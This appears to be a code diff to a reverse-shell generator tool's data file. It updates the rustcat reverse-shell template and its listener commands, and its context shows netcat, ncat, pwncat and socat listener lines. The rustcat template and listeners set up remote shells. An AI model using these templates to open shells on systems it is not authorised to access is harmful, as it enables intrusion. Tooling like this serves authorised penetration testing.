@@ -88,7 +88,7 @@ const reverseShellCommands = withCommandType(
         },
         {
             "name": "rustcat",
-            "command": "rcat {ip} {port} -r {shell}",
+            "command": "rcat connect -s {shell} {ip} {port}",
             "meta": ["linux", "mac"]
         },
         {
@@ -569,13 +569,12 @@ const rsgData = {
     listenerCommands: [
         ['nc', 'nc -lvnp {port}'],
         ['nc freebsd', 'nc -lvn {port}'],
-	['busybox nc', 'busybox nc -lp {port}'],
+		['busybox nc', 'busybox nc -lp {port}'],
         ['ncat', 'ncat -lvnp {port}'],
         ['ncat.exe', 'ncat.exe -lvnp {port}'],
         ['ncat (TLS)', 'ncat --ssl -lvnp {port}'],
         ['rlwrap + nc', 'rlwrap -cAr nc -lvnp {port}'],
-	['rustcat', 'rcat -lp {port}'],
-	['rustcat + Command History', 'rcat -lHp {port}'],
+		['rustcat', 'rcat listen {port}'],
         ['pwncat', 'python3 -m pwncat -lp {port}'],
         ['windows ConPty', 'stty raw -echo; (stty size; cat) | nc -lvnp {port}'],
         ['socat', 'socat -d -d TCP-LISTEN:{port} STDOUT'],
